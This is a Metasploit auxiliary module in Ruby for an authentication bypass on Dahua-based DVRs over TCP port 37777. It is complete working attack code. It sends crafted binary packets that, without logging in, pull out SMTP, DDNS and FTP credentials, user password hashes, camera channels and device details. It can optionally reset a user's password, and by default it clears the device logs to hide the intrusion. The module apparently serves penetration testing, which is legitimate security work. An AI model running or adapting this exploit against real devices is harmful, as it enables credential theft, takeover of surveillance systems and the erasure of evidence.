require 'msf/core'
class Metasploit3 < Msf::Auxiliary
    include Msf::Exploit::Remote::Tcp
    include Msf::Auxiliary::Scanner
    include Msf::Auxiliary::Report

    def initialize
      super(
        'Name'           => 'Dahua DVR Auth Bypas Scanner',
        'Description'    => 'Scans for Dahua-based DVRs and then grabs settings. Optionally resets a specific user password and clears the device logs',
        'Author'         => 'Jake Reynolds - Depth Security',
        'License'        => MSF_LICENSE
      )
      deregister_options('RHOST')
      register_options([
        OptString.new('USERNAME', [true, 'A username to reset', '888888']),
        OptString.new('PASSWORD', [true, 'A password to reset the user with', 'abc123']),
        OptBool.new('RESET', [true, 'Reset an existing user password', 'FALSE']),
        OptBool.new('CLEAR_LOGS', [true, 'Clear the DVR logs after execution', 'TRUE']),
        Opt::RPORT(37777)], self.class)
    end

    def run_host(ip)
      usercount = 0
      u1 =          "\xa1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      dvr_resp =    "\xb1\x00\x00\x58\x00\x00\x00\x00"

      version =     "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      email =       "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
                    "\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      ddns =        "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
                    "\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      nas =         "\xa3\x00\x00\x00\x00\x00\x00\x00\x63\x6f\x6e\x66\x69\x67\x00\x00" +
                    "\x25\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      channels =    "\xa8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
                    "\xa8\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      groups =      "\xa6\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      users =       "\xa6\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      sn =          "\xa4\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      clear_logs =  "\x60\x00\x00\x00\x00\x00\x00\x00\x90\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      clear_logs2 = "\x60\x00\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00" +
                    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

      connect()
      sock.put(u1)
      data = sock.recv(8)
      disconnect()
      if data == dvr_resp
        print_good("DVR FOUND: @ #{rhost}:#{rport}!")
        report_service(:host => rhost, :port => rport, :sname => 'dvr', :info => "Dahua-based DVR")
        connect()
        sock.put(version)
        data = sock.get(1024)
        if data =~ /[\x00]{8,}([[:print:]]+)/
          ver = $1
          print_status("Version: #{ver} @ #{rhost}:#{rport}!")
        end

        sock.put(sn)
        data = sock.get(1024)
        if data =~ /[\x00]{8,}([[:print:]]+)/
          serial = $1
          print_status("Serial Number: #{serial} @ #{rhost}:#{rport}!")
        end

        sock.put(email)
        if data = sock.get(1024).split('&&')
          print_status("Email Settings: @ #{rhost}:#{rport}!")
          if data[0] =~ /([\x00]{8,}(?=.{1,255}$)[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?(?:\.[0-9A-Za-z](?:(?:[0-9A-Za-z]|-){0,61}[0-9A-Za-z])?)*\.?+:\d+)/
            if mailhost = $1.split(':')
              print_status("  Server: #{mailhost[0]}")  if !mailhost[0].nil?
              print_status("  Destination Email: #{data[1]}")  if !mailhost[1].nil?
            end
            if !data[5].nil? and !data[6].nil?
              print_good("    SMTP User: #{data[5]}") if !data[5].nil?
              print_good("    SMTP Password: #{data[6]}") if !data[6].nil?
              report_auth_info(:host => mailhost[0], :port => mailhost[1], :user => data[5],
                               :pass => data[6], :type => "Mail", :active => true) if ( !mailhost[0].nil? and
                       !mailhost[1].nil? and !data[5].nil? and !data[6].nil? )
            end
          end
        end

        sock.put(ddns)
        if data = sock.get(1024)
          data = data.split(/&&[0-1]&&/)
          data.each_with_index do |val, index|
            if index > 0
              val = val.split("&&")
              print_status("DDNS Settings @ #{rhost}:#{rport}!:")
              print_status("  DDNS Service: #{val[0]}") if !val.nil?
              print_status("  DDNS Server:  #{val[1]}") if !val.nil?
              print_status("  DDNS Port: #{val[2]}") if !val.nil?
              print_status("  Domain: #{val[3]}") if !val.nil?
              print_good("    Username: #{val[4]}") if !val.nil?
              print_good("    Password: #{val[5]}") if !val.nil?
              report_auth_info(:host => val[1], :port => val[2], :user => val[4], :pass => val[5], :type => "DDNS",
                      :active => true) if ( !val[1].nil? and !val[2].nil? and !val[4].nil? and !val[5].nil? )
            end
          end
        end

        sock.put(nas)
        if data = sock.get(1024)
          print_status("Nas Settings @ #{rhost}:#{rport}!:")
          server = ''
          port = ''
          if data =~ /[\x00]{8,}[\x01][\x00]{3,3}([\x0-9a-f]{4,4})([\x0-9a-f]{2,2})/
            server =  $1.unpack('C*').join('.')
            port = $2.unpack('S')
            print_status("    Nas Server #{server}")
            print_status("    Nas Port: #{port}")
          end
          if data =~ /[\x00]{16,}([[:print:]]+)[\x00]{16,}([[:print:]]+)/
            ftpuser = $1
            ftppass = $2
            print_good("    FTP User: #{ftpuser}")
            print_good("    FTP Password: #{ftppass}")
          end
        end

        sock.put(channels)
        data = sock.get(1024).split('&&')
        disconnect()
        if (data.length > 1)
          print_status("Camera Channels @ #{rhost}:#{rport}!:")
          data.each_with_index do |val, index|
            print_status("  #{index+1}:#{val[/([[:print:]]+)/]}")
          end
        end
        connect()
        sock.put(users)
        if data = sock.get(1024).split('&&')
          print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
          data.each  do |val|
            usercount += 1
            print_status("  #{val[/(([\d]+)[:]([[:print:]]+))/]}")
          end
        end
        sock.put(groups)
        if data = sock.get(1024).split('&&')
          print_status("User Groups: @ #{rhost}:#{rport}!")
          data.each do |val|
            print_status("  #{val[/(([\d]+)[:]([\w]+))/]}")
          end
        end
        if (datastore['RESET'])
          userstring = datastore['USERNAME'] + ":Intel:" + datastore['PASSWORD'] +
              ":" +  datastore['PASSWORD']
          u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" +
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          u2 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00" +
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
          u3 = "\xa6\x00\x00\x00#{userstring.length.chr}\x00\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00" +
               "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
               userstring
          sock.put(u1)
          data = sock.get(1024)
          sock.put(u2)
          data = sock.get(1024)
          sock.put(u3)
          data = sock.get(1024)
          sock.put(u1)
          if data = sock.get(1024)
            print_good("PASSWORD RESET!: user #{datastore['USERNAME']}'s password reset to #{datastore['PASSWORD']}! @ #{rhost}:#{rport}!")
          end
        end


        if (datastore['CLEAR_LOGS'])
          sock.put(clear_logs)
          sock.put(clear_logs2)
          print_good("LOGS CLEARED! @ #{rhost}:#{rport}")
        end
        disconnect()
      end
    end
end
